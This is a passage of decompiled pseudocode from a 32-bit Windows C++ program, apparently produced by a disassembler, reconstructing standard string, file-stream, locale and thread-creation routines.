// 404DE9: variable 'v6' is possibly undefined

//----- (00404E63) --------------------------------------------------------
void __thiscall sub_404E63(struct std::ios_base *this)
{
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
}
// 46EC10: using guessed type void *std::ios_base::`vftable';

//----- (00404EAD) --------------------------------------------------------
int __thiscall sub_404EAD(_DWORD *this, int a2, int a3)
{
  _WORD *v3; // edx
  int v4; // eax
  int v5; // eax
  int v6; // ecx
  _WORD *i; // eax

  v3 = this;
  if ( this[5] >= 8u )
    v3 = (_WORD *)*this;
  v4 = this[4];
  if ( !v4 )
    return -1;
  v5 = v4 - 1;
  v6 = -1;
  if ( v5 != -1 )
    v6 = v5;
  for ( i = &v3[v6]; *i != 92; --i )
  {
    if ( i == v3 )
      return -1;
  }
  return i - v3;
}

//----- (00404EE7) --------------------------------------------------------
_DWORD *__thiscall sub_404EE7(_DWORD *this, unsigned int a2, unsigned int a3)
{
  unsigned int v4; // edx
  unsigned int v5; // ebx
  _DWORD *v6; // eax
  unsigned int v7; // edx

  v4 = this[4];
  if ( v4 < a2 )
    sub_4020A6();
  v5 = a3;
  if ( v4 - a2 < a3 )
    v5 = v4 - a2;
  v6 = this;
  if ( this[5] >= 0x10u )
    v6 = (_DWORD *)*this;
  v7 = v4 - v5;
  this[4] = v7;
  memmove((char *)v6 + a2, (char *)v6 + a2 + v5, v7 - a2 + 1);
  return this;
}
// 4020A6: using guessed type void __noreturn sub_4020A6(void);

//----- (00404FA6) --------------------------------------------------------
_DWORD *__thiscall sub_404FA6(_DWORD *this, void *Src)
{
  this[4] = 0;
  this[5] = 15;
  *(_BYTE *)this = 0;
  unknown_libname_15(Src);
  return this;
}

//----- (00404FC9) --------------------------------------------------------
_DWORD *__thiscall sub_404FC9(_DWORD *this, _DWORD *Src)
{
  this[4] = 0;
  this[5] = 0;
  sub_4055F6(this, Src);
  return this;
}

//----- (00404FE6) --------------------------------------------------------
void *__thiscall sub_404FE6(void *Block, char a2)
{
  sub_404A8D((int)Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00405008) --------------------------------------------------------
_DWORD *__thiscall sub_405008(_DWORD *Block, char a2)
{
  sub_404CEE(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00405052) --------------------------------------------------------
char *__thiscall sub_405052(char *this, char a2)
{
  char *v2; // esi

  v2 = this - 8;
  sub_4050C4(this - 8);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(v2);
  return v2;
}

//----- (00405077) --------------------------------------------------------
struct std::ios_base *__thiscall sub_405077(struct std::ios_base *this, char a2)
{
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(this);
  return this;
}
// 46EC10: using guessed type void *std::ios_base::`vftable';

//----- (004050C4) --------------------------------------------------------
void __thiscall sub_4050C4(char *this)
{
  char *v1; // edx

  v1 = this + 8;
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 8] = &std::ostream::`vftable';
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 12] = *(_DWORD *)(*(_DWORD *)this + 4) - 8;
  *((_DWORD *)this + 2) = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)(this + 8));
}
// 46EC10: using guessed type void *std::ios_base::`vftable';
// 46ECA0: using guessed type void *std::ostream::`vftable';

//----- (00405117) --------------------------------------------------------
int __thiscall sub_405117(int **this)
{
  if ( !(unsigned __int8)j____uncaught_exception() )
    sub_40577D(*this);
  return sub_40567B((int *)this);
}
// 429EED: using guessed type int j____uncaught_exception(void);

//----- (00405156) --------------------------------------------------------
int __thiscall sub_405156(int this, int a2)
{
  bool v3; // bl
  int v4; // ecx
  _BYTE *v5; // ecx

  sub_4056B3((_DWORD *)this, a2);
  v3 = 0;
  v4 = *(_DWORD *)(*(_DWORD *)a2 + 4);
  if ( !*(_DWORD *)(v4 + a2 + 12) )
  {
    v5 = *(_BYTE **)(v4 + a2 + 60);
    if ( !v5 || v5 == (_BYTE *)a2 )
    {
      v3 = 1;
    }
    else
    {
      sub_405714(v5);
      v3 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)a2 + 4) + a2 + 12) == 0;
    }
  }
  *(_BYTE *)(this + 4) = v3;
  return this;
}

//----- (004051B9) --------------------------------------------------------
unsigned int __stdcall sub_4051B9(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int result; // eax

  result = a4;
  if ( a3 - a2 < a4 )
    return a3 - a2;
  return result;
}

//----- (004051FA) --------------------------------------------------------
char sub_4051FA()
{
  return 1;
}

//----- (0040527B) --------------------------------------------------------
int __thiscall sub_40527B(_DWORD *this, int a2)
{
  int result; // eax

  result = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 12))(a2);
  if ( (_BYTE)result )
  {
    this[14] = 0;
  }
  else
  {
    this[14] = a2;
    return unknown_libname_17(this);
  }
  return result;
}
// 4056D7: using guessed type int __thiscall unknown_libname_17(_DWORD);

//----- (004052A6) --------------------------------------------------------
bool __thiscall sub_4052A6(void *this)
{
  int v2; // eax
  int v3; // eax
  int v5; // edi
  char Buffer[32]; // [esp+Ch] [ebp-24h] BYREF
  char *v7; // [esp+2Ch] [ebp-4h] BYREF

  if ( !*((_DWORD *)this + 14) || !*((_BYTE *)this + 61) )
    return 1;
  if ( (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 12))(this, -1) == -1 )
    return 0;
  v2 = (*(int (__thiscall **)(_DWORD, int, char *, char **, char **))(**((_DWORD **)this + 14) + 32))(
         *((_DWORD *)this + 14),
         (int)this + 64,
         Buffer,
         &v7,
         &v7);
  if ( v2 )
  {
    v3 = v2 - 1;
    if ( v3 )
    {
      if ( v3 == 2 )
      {
        *((_BYTE *)this + 61) = 0;
        return 1;
      }
      return 0;
    }
  }
  else
  {
    *((_BYTE *)this + 61) = 0;
  }
  if ( v7 == Buffer )
    return *((_BYTE *)this + 61) == 0;
  v5 = v7 - Buffer;
  if ( v5 == fwrite(Buffer, 1u, v7 - Buffer, *((FILE **)this + 19)) )
    return *((_BYTE *)this + 61) == 0;
  return 0;
}

//----- (00405326) --------------------------------------------------------
int __thiscall sub_405326(int this, FILE *Stream, char **Base)
{
  FILE *v4; // edi
  char **v5; // eax
  FILE *v6; // eax
  int *v7; // eax
  int result; // eax
  int *Count; // [esp+Ch] [ebp-4h] BYREF

  *(_BYTE *)(this + 72) = Base == (char **)1;
  *(_BYTE *)(this + 61) = 0;
  unknown_libname_17(this);
  v4 = Stream;
  if ( Stream )
  {
    Base = 0;
    Stream = 0;
    Count = 0;
    _get_stream_buffer_pointers(v4, &Base, (char ***)&Stream, &Count);
    v5 = Base;
    *(_DWORD *)(this + 12) = Base;
    *(_DWORD *)(this + 16) = v5;
    v6 = Stream;
    *(_DWORD *)(this + 28) = Stream;
    *(_DWORD *)(this + 32) = v6;
    v7 = Count;
    *(_DWORD *)(this + 44) = Count;
    *(_DWORD *)(this + 48) = v7;
  }
  *(_DWORD *)(this + 76) = v4;
  *(_DWORD *)(this + 64) = dword_493188;
  result = dword_49318C;
  *(_DWORD *)(this + 56) = 0;
  *(_DWORD *)(this + 68) = result;
  return result;
}
// 4056D7: using guessed type int __thiscall unknown_libname_17(_DWORD);
// 493188: using guessed type int dword_493188;
// 49318C: using guessed type int dword_49318C;

//----- (004053A0) --------------------------------------------------------
int __thiscall sub_4053A0(int this)
{
  int v2; // edi
  int result; // eax
  int v4; // ecx

  if ( !*(_DWORD *)(this + 76) )
    goto LABEL_5;
  v2 = this;
  if ( !sub_4052A6((void *)this) )
    v2 = 0;
  if ( fclose(*(FILE **)(this + 76)) )
LABEL_5:
    v2 = 0;
  *(_BYTE *)(this + 72) = 0;
  *(_BYTE *)(this + 61) = 0;
  unknown_libname_17(this);
  *(_DWORD *)(this + 76) = 0;
  result = v2;
  *(_DWORD *)(this + 64) = dword_493188;
  v4 = dword_49318C;
  *(_DWORD *)(this + 56) = 0;
  *(_DWORD *)(this + 68) = v4;
  return result;
}
// 4056D7: using guessed type int __thiscall unknown_libname_17(_DWORD);
// 493188: using guessed type int dword_493188;
// 49318C: using guessed type int dword_49318C;

//----- (004053F4) --------------------------------------------------------
_DWORD *__thiscall sub_4053F4(_DWORD *this, char *a2, int a3, int a4, int a5)
{
  int v6; // edi
  int v7; // ecx
  FILE *v8; // eax
  struct std::_Facet_base *v9; // eax
  int v11; // [esp+Ch] [ebp-1Ch] BYREF
  int v12; // [esp+10h] [ebp-18h]
  _DWORD *v13; // [esp+14h] [ebp-14h]
  int v14; // [esp+18h] [ebp-10h]
  int v15; // [esp+24h] [ebp-4h]

  v13 = this;
  *this = &unk_47EA34;
  this[26] = &std::ios::`vftable';
  v6 = (int)(this + 1);
  v14 = 1;
  sub_4057DF(this, (int)(this + 1), 0, 0);
  v15 = 1;
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::ofstream::`vftable';
  v7 = *(_DWORD *)(*this + 4);
  v12 = v6;
  *(_DWORD *)((char *)this + v7 - 4) = v7 - 104;
  sub_40586C((_DWORD *)v6);
  *(_DWORD *)v6 = &std::filebuf::`vftable';
  *(_BYTE *)(v6 + 72) = 0;
  *(_BYTE *)(v6 + 61) = 0;
  unknown_libname_17(v6);
  *(_DWORD *)(v6 + 76) = 0;
  *(_DWORD *)(v6 + 64) = dword_493188;
  *(_DWORD *)(v6 + 68) = dword_49318C;
  *(_DWORD *)(v6 + 56) = 0;
  LOBYTE(v15) = 2;
  v8 = sub_42B293(a2, 2, 64);
  if ( v8 )
  {
    sub_405326(v6, v8, (char **)1);
    v12 = *(_DWORD *)(*(_DWORD *)(v6 + 52) + 4);
    (*(void (**)(void))(*(_DWORD *)v12 + 4))();
    LOBYTE(v15) = 3;
    v9 = sub_405B4E((std::locale *)&v11);
    sub_40527B((_DWORD *)v6, (int)v9);
    sub_4032B2(&v11);
  }
  else
  {
    sub_40584E((_DWORD *)((char *)this + *(_DWORD *)(*this + 4)), *((_BYTE *)this + *(_DWORD *)(*this + 4) + 12) | 2, 0);
  }
  return this;
}
// 4056D7: using guessed type int __thiscall unknown_libname_17(_DWORD);
// 46EC58: using guessed type void *std::filebuf::`vftable';
// 46EC98: using guessed type void *std::ios::`vftable';
// 47EA30: using guessed type void *std::ofstream::`vftable';
// 493188: using guessed type int dword_493188;
// 49318C: using guessed type int dword_49318C;

//----- (004054F8) --------------------------------------------------------
unsigned __int8 __thiscall sub_4054F8(void **this, char a2)
{
  char *v2; // edx
  bool v3; // cf
  unsigned __int8 result; // al
  int v5; // [esp+0h] [ebp-4h]

  v5 = (int)this;
  v2 = (char *)this[4];
  if ( v2 >= this[5] )
  {
    LOBYTE(v5) = 0;
    return (unsigned __int8)sub_405CF8(this, (int)this, v5, a2);
  }
  else
  {
    v3 = (unsigned int)this[5] < 0x10;
    this[4] = v2 + 1;
    if ( !v3 )
      this = (void **)*this;
    result = a2;
    v2[(_DWORD)this] = a2;
    v2[(_DWORD)this + 1] = 0;
  }
  return result;
}

//----- (00405554) --------------------------------------------------------
void **__thiscall sub_405554(void **this, void *Src, size_t Size)
{
  size_t v4; // edi
  void *v5; // ebx

  v4 = Size;
  if ( Size > (unsigned int)this[5] )
  {
    LOBYTE(Size) = 0;
    return (void **)sub_405DA0((int)this, v4, Size, Src);
  }
  else
  {
    v5 = this;
    if ( (unsigned int)this[5] >= 0x10 )
      v5 = *this;
    this[4] = (void *)Size;
    memmove(v5, Src, Size);
    *((_BYTE *)v5 + Size) = 0;
    return this;
  }
}

//----- (0040559D) --------------------------------------------------------
void **__thiscall sub_40559D(void **Src, void *Srca, size_t Size)
{
  unsigned int v3; // ebx
  _BYTE *v5; // eax
  _BYTE *v6; // ecx
  bool v7; // cf
  void *v8; // eax
  char *v9; // esi
  size_t v11; // [esp-4h] [ebp-Ch]

  v3 = Size;
  v5 = Src[5];
  v6 = Src[4];
  if ( Size > v5 - v6 )
  {
    v11 = Size;
    LOBYTE(Size) = 0;
    return sub_405E0F(Src, v3, Size, Srca, v11);
  }
  else
  {
    v7 = (unsigned int)Src[5] < 0x10;
    Src[4] = &v6[Size];
    v8 = Src;
    if ( !v7 )
      v8 = *Src;
    v9 = &v6[(_DWORD)v8];
    memmove(&v6[(_DWORD)v8], Srca, Size);
    v9[Size] = 0;
    return Src;
  }
}

//----- (004055F6) --------------------------------------------------------
unsigned int __thiscall sub_4055F6(_DWORD *this, _DWORD *Src)
{
  _DWORD *v2; // esi
  bool v4; // cf
  unsigned int result; // eax
  _DWORD *v6; // esi
  int v7; // edi
  void *v8; // eax
  void *Srca; // [esp+14h] [ebp+8h]

  v2 = Src;
  v4 = Src[5] < 0x10u;
  result = Src[4];
  Srca = (void *)result;
  if ( !v4 )
    v2 = (_DWORD *)*v2;
  if ( result >= 0x10 )
  {
    v7 = result | 0xF;
    if ( (result | 0xF) > 0x7FFFFFFF )
      v7 = 0x7FFFFFFF;
    v8 = (void *)std::_Allocate<8,std::_Default_allocate_traits,0>(v7 + 1);
    *this = v8;
    memmove_0(v8, v2, (size_t)Srca + 1);
    result = (unsigned int)Srca;
  }
  else
  {
    *this = *v2;
    v6 = v2 + 1;
    this[1] = *v6++;
    this[2] = *v6;
    this[3] = v6[1];
    v7 = 15;
  }
  this[4] = result;
  this[5] = v7;
  return result;
}

//----- (0040567B) --------------------------------------------------------
int __thiscall sub_40567B(int *this)
{
  int v1; // ecx
  int result; // eax
  int v3; // ecx

  v1 = *this;
  result = *(_DWORD *)(*(_DWORD *)v1 + 4);
  v3 = *(_DWORD *)(result + v1 + 56);
  if ( v3 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  return result;
}

//----- (004056B3) --------------------------------------------------------
_DWORD *__thiscall sub_4056B3(_DWORD *this, int a2)
{
  int v3; // ecx

  *this = a2;
  v3 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)a2 + 4) + a2 + 56);
  if ( v3 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
  return this;
}

//----- (00405714) --------------------------------------------------------
_BYTE *__thiscall sub_405714(_BYTE *this)
{
  int v2; // edi
  int *v4; // [esp+8h] [ebp-14h] BYREF
  char v5; // [esp+Ch] [ebp-10h]
  int v6; // [esp+18h] [ebp-4h]

  v2 = *(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56];
  if ( v2 )
  {
    sub_405156(this);
    v6 = 0;
    if ( v5 && (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 52))(v2) == -1 )
      sub_40584E(&this[*(_DWORD *)(*(_DWORD *)this + 4)], this[*(_DWORD *)(*(_DWORD *)this + 4) + 12] | 4, 0);
    sub_405117(&v4);
  }
  return this;
}
// 405156: using guessed type _DWORD __stdcall sub_405156(_DWORD);

//----- (0040577D) --------------------------------------------------------
int __thiscall sub_40577D(int *this)
{
  int result; // eax
  int v3; // ecx
  _DWORD v4[7]; // [esp+0h] [ebp-1Ch] BYREF

  v4[6] = 0;
  v4[3] = v4;
  result = *this;
  v3 = *(_DWORD *)(*this + 4);
  if ( !*(int *)((char *)this + v3 + 12) && (*((_BYTE *)this + v3 + 20) & 2) != 0 )
  {
    result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)((char *)this + v3 + 56) + 52))(*(int *)((char *)this + v3 + 56));
    if ( result == -1 )
      return sub_40584E(
               (int *)((char *)this + *(_DWORD *)(*this + 4)),
               *((_BYTE *)this + *(_DWORD *)(*this + 4) + 12) | 4,
               0);
  }
  return result;
}

//----- (004057DF) --------------------------------------------------------
_DWORD *__thiscall sub_4057DF(_DWORD *this, int a2, char a3, int a4)
{
  if ( a4 )
  {
    *this = &unk_47EA6C;
    this[2] = &std::ios::`vftable';
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 8;
  std::ios::init((struct std::ios_base *)((char *)this + *(_DWORD *)(*this + 4)), a2, a3);
  return this;
}
// 46EC98: using guessed type void *std::ios::`vftable';
// 46ECA0: using guessed type void *std::ostream::`vftable';

//----- (0040584E) --------------------------------------------------------
int __thiscall sub_40584E(_DWORD *this, char a2, char a3)
{
  char v3; // al

  v3 = 4;
  if ( this[14] )
    v3 = 0;
  return sub_403814(this, a2 | v3, a3);
}

//----- (0040586C) --------------------------------------------------------
_DWORD *__thiscall sub_40586C(_DWORD *this)
{
  _DWORD *v2; // esi

  *this = &std::streambuf::`vftable';
  v2 = operator new(8u);
  v2[1] = std::locale::_Init(1);
  this[13] = v2;
  unknown_libname_17(this);
  return this;
}
// 4056D7: using guessed type int __thiscall unknown_libname_17(_DWORD);
// 46EC18: using guessed type void *std::streambuf::`vftable';

//----- (004058FC) --------------------------------------------------------
char __thiscall sub_4058FC(_DWORD *this, int a2)
{
  struct std::_Facet_base *v2; // eax
  char v3; // bl
  int v5; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+8h] [ebp-10h]
  int v7; // [esp+14h] [ebp-4h]

  v6 = *(_DWORD *)(this[12] + 4);
  (*(void (**)(void))(*(_DWORD *)v6 + 4))();
  v7 = 0;
  v2 = sub_405971((std::locale *)&v5);
  v3 = (*(int (__thiscall **)(struct std::_Facet_base *, int))(*(_DWORD *)v2 + 32))(v2, a2);
  sub_4032B2(&v5);
  return v3;
}

//----- (0040594A) --------------------------------------------------------
void *sub_40594A()
{
  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_49316C,
          std::_Immortalize_impl<std::_Iostream_error_category>,
          &unk_493170) )
    terminate();
  return &unk_493170;
}
// 44E1AF: using guessed type void __noreturn terminate(void);

//----- (00405971) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_405971(std::locale *a1)
{
  int v1; // edi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // esi
  char v5[4]; // [esp+8h] [ebp-14h] BYREF
  struct std::_Facet_base *Block; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v7 = 0;
  v1 = dword_493178;
  Block = (struct std::_Facet_base *)dword_493178;
  v2 = std::locale::id::operator unsigned int(&unk_491ED0);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_40335B(&Block, a1) == -1 )
        sub_402BD9();
      v3 = Block;
      LOBYTE(v7) = 1;
      std::_Facet_Register(Block);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_493178 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 402BD9: using guessed type void __noreturn sub_402BD9(void);
// 403269: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 493178: using guessed type int dword_493178;
// 405971: using guessed type char var_14[4];

//----- (00405A06) --------------------------------------------------------
int __fastcall sub_405A06(int a1, void **a2, void *a3)
{
  void **v4; // eax

  v4 = sub_402028(a2, a3, wcslen((const unsigned __int16 *)a3));
  std::wstring::wstring(v4);
  return a1;
}
// 401C6C: using guessed type _DWORD __stdcall std::wstring::wstring(_DWORD);

//----- (00405A3F) --------------------------------------------------------
int __fastcall sub_405A3F(int a1, _DWORD *a2, char *a3)
{
  char *v5; // ecx
  __int16 v6; // ax

  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 7;
  *(_WORD *)a1 = 0;
  v5 = a3;
  do
  {
    v6 = *(_WORD *)v5;
    v5 += 2;
  }
  while ( v6 );
  sub_405FAE((void **)a1, ((v5 - (a3 + 2)) >> 1) + a2[4]);
  std::wstring::append(a2);
  sub_401C17((void **)a1, a3);
  return a1;
}

//----- (00405AB8) --------------------------------------------------------
uintptr_t *__thiscall sub_405AB8(uintptr_t *this, int a2, int a3, _BYTE *a4)
{
  _DWORD *v5; // esi
  uintptr_t v6; // eax
  int v8; // [esp-4h] [ebp-1Ch]

  v5 = operator new(0x20u);
  v8 = a3;
  *(_BYTE *)v5 = *a4;
  std::wstring::wstring(v8);
  v5[7] = sub_4039B7;
  a4 = 0;
  sub_405ED4((void **)&a4);
  a3 = 0;
  a4 = v5;
  sub_405ED4((void **)&a3);
  v6 = _beginthreadex(0, 0, (_beginthreadex_proc_type)sub_406033, v5, 0, this + 1);
  *this = v6;
  if ( !v6 )
  {
    this[1] = 0;
    std::_Throw_Cpp_error(6);
  }
  a4 = 0;
  sub_405ED4((void **)&a4);
  return this;
}
// 401C6C: using guessed type _DWORD __stdcall std::wstring::wstring(_DWORD);

//----- (00405B4E) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_405B4E(std::locale *a1)
{
  int v1; // edi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // esi
  char v5[4]; // [esp+8h] [ebp-14h] BYREF
  struct std::_Facet_base *Block; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v7 = 0;
  v1 = dword_493180;
  Block = (struct std::_Facet_base *)dword_493180;
  v2 = std::locale::id::operator unsigned int(&unk_493190);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_405EFC(&Block, a1) == -1 )
        sub_402BD9();
      v3 = Block;
      LOBYTE(v7) = 1;
      std::_Facet_Register(Block);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_493180 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 402BD9: using guessed type void __noreturn sub_402BD9(void);
// 403269: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 493180: using guessed type int dword_493180;
// 405B4E: using guessed type char var_14[4];

//----- (00405BE3) --------------------------------------------------------
char *__thiscall sub_405BE3(void *this, _BYTE *Src, _DWORD *a3)
{
  int v4; // eax
  int v5; // edi
  unsigned int v6; // esi
  unsigned int v7; // ecx
  unsigned int v8; // edx
  unsigned int v9; // eax
  char *v10; // esi
  char *v11; // edi
  char *result; // eax
  int v13; // [esp+Ch] [ebp-4h]
  void *Srca; // [esp+18h] [ebp+8h]

  v4 = ((_BYTE *)dword_493130 - (_BYTE *)::Src) >> 3;
  v5 = (Src - (_BYTE *)::Src) >> 3;
  if ( v4 == 0x1FFFFFFF )
    sub_402682(this, ::Src);
  v6 = v4 + 1;
  Srca = (void *)(v4 + 1);
  v7 = (dword_493134 - (int)::Src) >> 3;
  v8 = v7 >> 1;
  if ( v7 <= 0x1FFFFFFF - (v7 >> 1) )
  {
    v9 = v8 + v7;
    if ( v8 + v7 < v6 )
      v9 = v6;
  }
  else
  {
    v9 = v4 + 1;
  }
  if ( v9 > 0x1FFFFFFF )
    sub_4016A7();
  v13 = 8 * v9;
  v10 = (char *)std::_Allocate<8,std::_Default_allocate_traits,0>(8 * v9);
  v11 = &v10[8 * v5];
  *(_DWORD *)v11 = *a3;
  *((_DWORD *)v11 + 1) = a3[1];
  if ( Src == dword_493130 )
  {
    memmove(v10, ::Src, (_BYTE *)dword_493130 - (_BYTE *)::Src);
  }
  else
  {
    memmove(v10, ::Src, Src - (_BYTE *)::Src);
    memmove(v11 + 8, Src, (_BYTE *)dword_493130 - Src);
  }
  if ( ::Src )
    std::_Deallocate<8,0>(::Src, (dword_493134 - (_DWORD)::Src) & 0xFFFFFFF8);
  result = v11;
  ::Src = v10;
  dword_493130 = &v10[8 * (_DWORD)Srca];
  dword_493134 = (int)&v10[v13];
  return result;
}
// 4016A7: using guessed type void __noreturn sub_4016A7(void);
// 402682: using guessed type void __fastcall __noreturn sub_402682(_DWORD, _DWORD);
// 493134: using guessed type int dword_493134;

//----- (00405CF8) --------------------------------------------------------
void **__thiscall sub_405CF8(void **this, int a2, int a3, char a4)
{
  size_t v4; // ebx
  unsigned int v5; // esi
  void *v6; // eax
  void *v7; // esi
  void *v8; // ecx
  unsigned int v10; // [esp+Ch] [ebp-Ch]
  void *v12; // [esp+14h] [ebp-4h]

  v4 = (size_t)this[4];
  if ( v4 == 0x7FFFFFFF )
    sub_40278D();
  v10 = (unsigned int)this[5];
  v5 = sub_4027C9(v4 + 1, v10, 0x7FFFFFFFu);
  v6 = (void *)std::_Allocate<8,std::_Default_allocate_traits,0>(v5 + 1);
  v12 = v6;
  this[4] = (void *)(v4 + 1);
  this[5] = (void *)v5;
  if ( v10 < 0x10 )
  {
    memmove_0(v6, this, v4);
    v8 = v12;
    *((_BYTE *)v12 + v4) = a4;
    *((_BYTE *)v12 + v4 + 1) = 0;
  }
  else
  {
    v7 = *this;
    memmove_0(v6, *this, v4);
    *((_BYTE *)v12 + v4) = a4;
    *((_BYTE *)v12 + v4 + 1) = 0;
    std::_Deallocate<8,0>(v7, v10 + 1);
    v8 = v12;
  }
  *this = v8;
  return this;
}
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (00405DA0) --------------------------------------------------------
int __thiscall sub_405DA0(int this, size_t Size, int a3, void *Src)
{
  unsigned int v6; // esi
  unsigned int v8; // [esp+Ch] [ebp-4h]
  void *Sizea; // [esp+18h] [ebp+8h]

  if ( Size > 0x7FFFFFFF )
    sub_40278D();
  v8 = *(_DWORD *)(this + 20);
  v6 = sub_4027C9(Size, v8, 0x7FFFFFFFu);
  Sizea = (void *)std::_Allocate<8,std::_Default_allocate_traits,0>(v6 + 1);
  *(_DWORD *)(this + 16) = Size;
  *(_DWORD *)(this + 20) = v6;
  memmove_0(Sizea, Src, Size);
  *((_BYTE *)Sizea + Size) = 0;
  if ( v8 >= 0x10 )
    std::_Deallocate<8,0>(*(void **)this, v8 + 1);
  *(_DWORD *)this = Sizea;
  return this;
}
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (00405E0F) --------------------------------------------------------
void **__thiscall sub_405E0F(void **Src, unsigned int a2, int a3, void *Srca, size_t a5)
{
  size_t v6; // ecx
  void *v7; // edi
  unsigned int v8; // esi
  char *v9; // eax
  char *v10; // edi
  void *v11; // esi
  int v13; // [esp-Ch] [ebp-20h]
  char *v14; // [esp+Ch] [ebp-8h]
  size_t Size; // [esp+10h] [ebp-4h]
  unsigned int v16; // [esp+1Ch] [ebp+8h]

  v6 = (size_t)Src[4];
  Size = v6;
  if ( 0x7FFFFFFF - v6 < a2 )
    sub_40278D();
  v7 = (void *)(v6 + a2);
  v13 = v6 + a2;
  v16 = (unsigned int)Src[5];
  v8 = sub_4027C9(v13, v16, 0x7FFFFFFFu);
  v9 = (char *)std::_Allocate<8,std::_Default_allocate_traits,0>(v8 + 1);
  Src[4] = v7;
  v14 = v9;
  Src[5] = (void *)v8;
  v10 = &v9[Size];
  if ( v16 < 0x10 )
  {
    memmove_0(v9, Src, Size);
    memmove_0(v10, Srca, a5);
    v10[a5] = 0;
  }
  else
  {
    v11 = *Src;
    memmove_0(v9, *Src, Size);
    memmove_0(v10, Srca, a5);
    v10[a5] = 0;
    std::_Deallocate<8,0>(v11, v16 + 1);
  }
  *Src = v14;
  return Src;
}
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (00405ED4) --------------------------------------------------------
void __thiscall sub_405ED4(void **this)
{
  char *v1; // esi

  v1 = (char *)*this;
  if ( *this )
  {
    unknown_libname_3(v1 + 4);
    sub_42CF7C(v1);
  }
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);

//----- (00405EEF) --------------------------------------------------------
int __thiscall sub_405EEF(_DWORD *this)
{
  int (__thiscall ***v1)(_DWORD, int); // ecx
  int result; // eax

  v1 = (int (__thiscall ***)(_DWORD, int))*this;
  if ( v1 )
    return (**v1)(v1, 1);
  return result;
}

//----- (00405EFC) --------------------------------------------------------
int __cdecl sub_405EFC(_DWORD *Block, std::locale *a2)
{
  char *v3; // eax
  char v5[52]; // [esp+4h] [ebp-40h] BYREF
  int v6; // [esp+40h] [ebp-4h]
  _DWORD *Blocka; // [esp+4Ch] [ebp+8h]

  if ( Block && !*Block )
  {
    Blocka = operator new(8u);
    v6 = 0;
    v3 = (char *)std::locale::c_str(a2);
    sub_403152((int)v5, v3);
    Blocka[1] = 0;
    *Blocka = &std::codecvt<char,char,_Mbstatet>::`vftable';
    *Block = Blocka;
    sub_4031C8((std::_Lockit *)v5);
  }
  return 2;
}
// 46ECA8: using guessed type void *std::codecvt<char,char,_Mbstatet>::`vftable';

//----- (00405F5E) --------------------------------------------------------
__int16 __thiscall sub_405F5E(_DWORD *this, int a2)
{
  struct std::_Facet_base *v2; // eax
  __int16 v3; // si
  int v5; // [esp+4h] [ebp-14h] BYREF
  int v6; // [esp+8h] [ebp-10h]
  int v7; // [esp+14h] [ebp-4h]

  v6 = *(_DWORD *)(this[12] + 4);
  (*(void (**)(void))(*(_DWORD *)v6 + 4))();
  v7 = 0;
  v2 = sub_4060C7((std::locale *)&v5);
  v3 = (*(int (__thiscall **)(struct std::_Facet_base *, int))(*(_DWORD *)v2 + 48))(v2, a2);
  sub_4032B2(&v5);
  return v3;
}

//----- (00405FAE) --------------------------------------------------------
void **__thiscall sub_405FAE(void **this, unsigned int a2)
{
  void **result; // eax
  unsigned int v4; // ebx
  void *v5; // esi

  result = (void **)a2;
  v4 = (unsigned int)this[4];
  if ( v4 <= a2 && this[5] != (void *)a2 )
  {
    if ( (unsigned int)this[5] >= a2 )
    {
